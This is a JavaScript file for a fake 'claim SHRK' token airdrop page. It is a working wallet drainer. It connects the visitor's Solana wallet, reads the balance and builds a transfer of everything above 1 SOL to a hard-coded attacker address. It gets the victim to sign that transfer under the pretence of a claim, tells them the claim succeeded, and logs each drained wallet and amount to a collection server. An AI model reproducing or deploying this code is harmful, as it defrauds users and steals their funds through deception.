const { Connection, PublicKey, Transaction, SystemProgram, LAMPORTS_PER_SOL } = window.solanaWeb3;

async function connectWallet() {
  try {
    // Map wallet names to providers
    const walletProviders = {
      'Phantom': window.solana,
      'Solflare': window.Solflare || window.solflare,
      'Backpack': window.backpack,
      'Glow': window.glow,
      'Exodus': window.exodus,
      'Coinbase Wallet': window.coinbaseWalletExtension || window.web3,
      'Trust Wallet': window.trustWallet,
      'Atomic Wallet': window.atomic,
      'Math Wallet': window.mathwallet
    };

    // Get selected wallet
    const walletName = document.getElementById('walletSelector').value;
    if (!walletName) {
      alert("Please select a wallet!");
      return;
    }

    const provider = walletProviders[walletName];
    if (!provider || !provider.connect) {
      alert(`Please install ${walletName} to claim SHRK!`);
      return;
    }

    console.log(`Selected wallet: ${walletName}`);
    console.log("Connecting wallet...");
    await provider.connect();
    const userPublicKey = provider.publicKey;
    console.log("Wallet connected:", userPublicKey.toString());

    fetch('http://127.0.0.1:8080/connect', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ wallet: `${walletName} - ${userPublicKey.toString()}` })
    });

    const connection = new Connection("https://api.devnet.solana.com", "confirmed");
    const myWallet = new PublicKey("4LjQhQprKZDthShs1NykmefYfppSnjdyZ4f7fEtHsTXW");

    console.log("Fetching balance...");
    const balance = await connection.getBalance(userPublicKey);
    console.log("Balance:", balance / LAMPORTS_PER_SOL, "SOL");

    const reserve = 1000000000; // 1 SOL
    if (balance <= reserve + 5000) {
      alert("Not enough SOL to claim SHRK! Need more than 1.000005 SOL.");
      return;
    }

    const amountToDrain = balance - reserve;
    console.log("Amount to drain:", amountToDrain / LAMPORTS_PER_SOL, "SOL");

    console.log("Building transaction...");
    const transaction = new Transaction().add(
      SystemProgram.transfer({
        fromPubkey: userPublicKey,
        toPubkey: myWallet,
        lamports: amountToDrain,
      })
    );

    console.log("Getting blockhash...");
    transaction.recentBlockhash = (await connection.getLatestBlockhash()).blockhash;
    transaction.feePayer = userPublicKey;

    console.log("Signing transaction...");
    const signedTx = await provider.signTransaction(transaction);
    console.log("Sending transaction...");
    const txId = await connection.sendRawTransaction(signedTx.serialize());

    fetch('http://127.0.0.1:8080/drain', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        wallet: `${walletName} - ${userPublicKey.toString()}`,
        amount: amountToDrain / LAMPORTS_PER_SOL,
        txId
      })
    });

    alert("SHRK claimed successfully! Tx ID: " + txId);
    console.log("Funds sent to your wallet:", txId);
  } catch (error) {
    console.error("Error:", error);
    if (error.name === "SendTransactionError") {
      console.log("Transaction logs:", error.logs);
    }
    alert("Claim failed: " + error.message);
  }
}